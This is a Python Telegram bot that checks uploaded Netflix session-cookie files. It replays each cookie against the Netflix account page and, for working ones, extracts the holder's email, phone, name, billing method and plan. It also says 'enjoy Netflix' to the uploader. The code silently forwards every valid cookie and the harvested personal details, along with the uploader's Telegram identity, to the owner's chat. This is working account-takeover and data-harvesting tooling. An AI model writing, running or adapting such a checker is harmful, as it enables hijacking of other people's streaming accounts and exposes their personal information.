#!/usr/bin/env python3
import os
import io
import json
import zipfile
import logging
import requests
import re
from datetime import datetime, timezone

import pycountry
import langcodes
from dotenv import load_dotenv
from telegram import Update, Document, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# Load environment variables
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OWNER_CHAT_ID = os.getenv("OWNER_CHAT_ID")
CHANNEL_CHAT_ID = os.getenv("CHANNEL_CHAT_ID")  # Channel Chat ID
if not TELEGRAM_TOKEN or not OWNER_CHAT_ID or not CHANNEL_CHAT_ID:
    logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, and CHANNEL_CHAT_ID in your .env")
    exit(1)
OWNER_CHAT_ID = int(OWNER_CHAT_ID)
CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Function to get the invite link of the channel
async def get_channel_invite_link(context):
    try:
        invite_link = await context.bot.export_chat_invite_link(CHANNEL_CHAT_ID)
        return invite_link
    except Exception as e:
        logger.error(f"Error getting invite link: {e}")
        return None

def parse_cookies(file_content: str, file_type: str) -> dict:
    if file_type.lower() == 'json' or file_content.lstrip().startswith('['):
        try:
            arr = json.loads(file_content)
            if isinstance(arr, list):
                return {
                    c['name']: c['value']
                    for c in arr
                    if isinstance(c, dict) and 'name' in c and 'value' in c
                }
        except json.JSONDecodeError:
            pass

    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]

    if not cookies and file_content.strip():
        for pair in file_content.split(';'):
            pair = pair.strip()
            if '=' in pair:
                name, value = pair.split('=', 1)
                cookies[name] = value

    return cookies

def extract_netflix_account_info(html: str) -> str | None:
    tp = re.search(
        r'"thirdPartyBillingPartner"\s*:\s*{[^}]*"value"\s*:\s*(true|false)',
        html
    )
    if tp and tp.group(1).lower() == 'true':
        pm = re.search(
            r'"paymentMethod"\s*:\s*{[^}]*"value"\s*:\s*"([^" ]+)"',
            html
        )
        if pm:
            method = pm.group(1).replace('_', ' ').upper()
            return (
                "Account info\n"
                "Billed: Third party\n"
                f"Using: {method}"
            )
    pm = re.search(
        r'"paymentMethods"\s*:\s*{.*?"value"\s*:\s*\[\s*{'
        r'.*?"paymentMethod"\s*:\s*{[^}]*?"value"\s*:\s*"([^" ]+)"[^}]*}'
        r'.*?"displayText"\s*:\s*{[^}]*?"value"\s*:\s*"([^\"]+)"',
        html,
        re.DOTALL
    )
    if pm:
        pm_raw, display_raw = pm.group(1), pm.group(2)
        type_m = re.search(
            r'"type"\s*:\s*{[^}]*?"value"\s*:\s*"([^" ]+)"',
            html
        )
        type_raw = type_m.group(1) if type_m else pm_raw
        method  = pm_raw.replace('_', ' ').upper()
        display = bytes(display_raw, 'utf-8').decode('unicode_escape').replace('*', '•')
        using   = f"{type_raw.replace('_',' ').upper()} {display}"
        return (
            "Account info\n"
            f"Billed: {method}\n"
            f"Using: {using}"
        )
    return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if the user is a member of the channel
    user = update.message.from_user
    user_id = user.id
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    
    # Check user membership in the channel
    try:
        chat_member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            await update.message.reply_text(
                f"👋 Hi! {full_name}\nSend me your Netflix‑cookies file(s) in .txt, .json, or .zip format, and I’ll check whether they’re still valid.",
                reply_to_message_id=update.message.message_id  # Reply to the original message
            )
        else:
            invite_link = await get_channel_invite_link(context)
            if invite_link:
                keyboard = [[InlineKeyboardButton("Join in channel", url=invite_link)]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(
                    f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
                    reply_markup=reply_markup,
                    reply_to_message_id=update.message.message_id  # Reply to the original message
                )
            else:
                await update.message.reply_text(
                    f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
                    reply_to_message_id=update.message.message_id  # Reply to the original message
                )
    except Exception as e:
        logger.error(f"Error checking membership for user {user_id}: {e}")
        await update.message.reply_text(
            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
            reply_to_message_id=update.message.message_id  # Reply to the original message
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document
    orig_id = update.message.message_id
    bot_user = context.bot.username
    user = update.message.from_user
    user_id = user.id
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    username_str = f"@{user.username}" if user.username else "N/A"

    # Check if user is a member of the channel
    try:
        chat_member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
        if chat_member.status not in ['member', 'administrator', 'creator']:
            invite_link = await get_channel_invite_link(context)
            if invite_link:
                keyboard = [[InlineKeyboardButton("Join in channel", url=invite_link)]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                return await update.message.reply_text(
                    f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
                    reply_markup=reply_markup,
                    reply_to_message_id=orig_id  # Reply to the original message
                )
    except Exception as e:
        logger.error(f"Error checking membership for user {user_id}: {e}")
        return await update.message.reply_text(
            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
            reply_to_message_id=orig_id  # Reply to the original message
        )

    # download into memory
    file = await doc.get_file()
    data = await file.download_as_bytearray()
    buf = io.BytesIO(data)

    # determine extension and initialize files list
    filename = doc.file_name
    ext = os.path.splitext(filename)[1].lower()
    files = []

    if ext in ('.txt', '.json'):
        text = buf.read().decode('utf-8', errors='ignore')
        files.append((filename, text, ext.lstrip('.')))
    elif ext == '.zip':
        with zipfile.ZipFile(buf) as zf:
            for zi in zf.infolist():
                base = os.path.basename(zi.filename)
                if zi.filename.startswith('__MACOSX/') or base.startswith('._'):
                    continue
                if zi.filename.lower().endswith(('.txt', '.json')):
                    text = zf.read(zi).decode('utf-8', errors='ignore')
                    files.append((zi.filename, text, zi.filename.split('.')[-1]))
    else:
        return await update.message.reply_text(
            "⚠️ Unsupported file type. Please send .txt, .json or .zip.",
            reply_to_message_id=orig_id  # Reply to the original message
        )

    if not files:
        return await update.message.reply_text(
            "🚫 No .txt/.json cookie files found.",
            reply_to_message_id=orig_id  # Reply to the original message
        )

    for name, content, ftype in files:
        context.application.create_task(
            process_file(
                chat_id=update.effective_chat.id,
                orig_id=orig_id,
                name=name,
                content=content,
                ftype=ftype,
                bot_user=bot_user,
                user_id=user_id,
                full_name=full_name,
                username_str=username_str,
                context=context
            )
        )

async def process_file(
    chat_id: int,
    orig_id: int,
    name: str,
    content: str,
    ftype: str,
    bot_user: str,
    user_id: int,
    full_name: str,
    username_str: str,
    context: ContextTypes.DEFAULT_TYPE
):
    cookies = parse_cookies(content, ftype)
    if not cookies:
        return await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ Cookie format is incorrect, please send correct cookie format",
            reply_to_message_id=orig_id  # Reply to the original message
        )

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    session.cookies.update(cookies)
    try:
        resp = session.get(
            "https://www.netflix.com/account",
            allow_redirects=True,
            timeout=10
        )
        html = resp.text
        valid = resp.url.startswith("https://www.netflix.com/account")
    except Exception:
        valid = False
        html = ""

    if valid:
        info = extract_netflix_account_info(html)
        billed_using = info.splitlines()[1:] if info else []

        # --- NEW: Extract "canChangePlan" ---
        change_plan_m = re.search(r'"canChangePlan":\s*{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)}', html)
        can_change_plan = change_plan_m.group(1).capitalize() if change_plan_m else "Unknown"

        hold_m = re.search(r'"isUserOnHold"\s*:\s*(true|false)', html)
        hold = hold_m.group(1).capitalize() if hold_m else None

        # --- Decode plan name ---
        pd_m = re.search(
            r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"',
            html
        )
        if pd_m:
            raw_plan = pd_m.group(1)
            plan = bytes(raw_plan, "utf-8").decode("unicode_escape")
        else:
            plan = None

        ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
        membership = ms_m.group(1).replace('_', ' ').title() if ms_m else None

        co_m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', html)
        country = None
        if co_m:
            code = co_m.group(1)
            country = f"({code}) {pycountry.countries.get(alpha_2=code).name}"

        fn_m = re.search(r'"firstName"\s*:\s*"([^"]+)"', html)
        name_val = fn_m.group(1) if fn_m else None
        if name_val:
            name_val = bytes(name_val, 'utf-8').decode('unicode_escape')  # Fix for decoding \x20

        em_m = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
        mail = bytes(em_m.group(1), 'utf-8').decode('unicode_escape') if em_m else None

        ph_m = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
        phone = bytes(ph_m.group(1), 'utf-8').decode('unicode_escape') if ph_m else None

        ms2_m = re.search(r'"memberSince"\s*:\s*{[^}]*"value"\s*:\s*(\d+)', html)
        signup = None
        if ms2_m:
            ts = int(ms2_m.group(1)) / 1000.0
            dt = datetime.fromtimestamp(ts, tz=timezone.utc)
            signup = dt.strftime("%b %-d, %Y at %H:%M:%S UTC")

        np_m = re.search(r'"nextBillingDate"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"', html)
        next_pay = bytes(np_m.group(1), 'utf-8').decode('unicode_escape') if np_m else None

        ems_m = re.search(r'"showExtraMemberSection"\s*:\s*{[^}]*"value"\s*:\s*(true|false)', html)
        extra_slots = ems_m.group(1).capitalize() if ems_m else None

        lang_m = re.search(r'"language"\s*:\s*"([a-z]{2})"', html)
        display_lang = None
        if lang_m:
            display_lang = langcodes.Language.get(lang_m.group(1)).display_name()

        # Build the response
        section = ["Account Information:"]
        section += billed_using
        if country:      section.append(f"Country: {country}")
        if membership:   section.append(f"Membership status: {membership}")
        if hold is not None:
            status = "Active" if hold == "False" else "On Hold"
            section.append(f"Plan status: {status}")
        if plan:         section.append(f"Plan details: {plan}")
        section.append(f"Can change plan: {can_change_plan}")
        if next_pay:     section.append(f"Next payment: {next_pay}")
        if signup:       section.append(f"Signup D&T: {signup}")
        if extra_slots:  section.append(f"Extra Slots: {extra_slots}")
        if mail:         section.append(f"Mail: {mail}")
        if phone:        section.append(f"Phone: {phone}")
        if name_val:     section.append(f"Name: {name_val}")
        if display_lang: section.append(f"Display Language: {display_lang}")

        base_caption = f"✅  This cookie is working, enjoy Netflix 🍿. Checked by @{bot_user}"
        full_caption = base_caption + "\n\n" + "\n".join(section)

        # reply to user
        bio = io.BytesIO(content.encode('utf-8'))
        bio.seek(0)
        new_name = f"@{bot_user}-{orig_id}.json"
        input_file = InputFile(bio, filename=new_name)
        await context.bot.send_document(
            chat_id=chat_id,
            document=input_file,
            caption=full_caption,
            reply_to_message_id=orig_id  # Reply to the original message
        )

        # silently forward to owner
        owner_caption = (
            f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
            f"Full name: {full_name}\n"
            f"Username: {username_str}\n\n"
            + "\n".join(section)
        )
        await context.bot.send_document(
            chat_id=OWNER_CHAT_ID,
            document=input_file,
            caption=owner_caption,
            parse_mode='HTML'
        )
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌  This cookie is invalid or expired",
            reply_to_message_id=orig_id  # Reply to the original message
        )

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(
        MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document)
    )
    app.run_polling()
    logger.info("Bot started.")

if __name__ == "__main__":
    main()
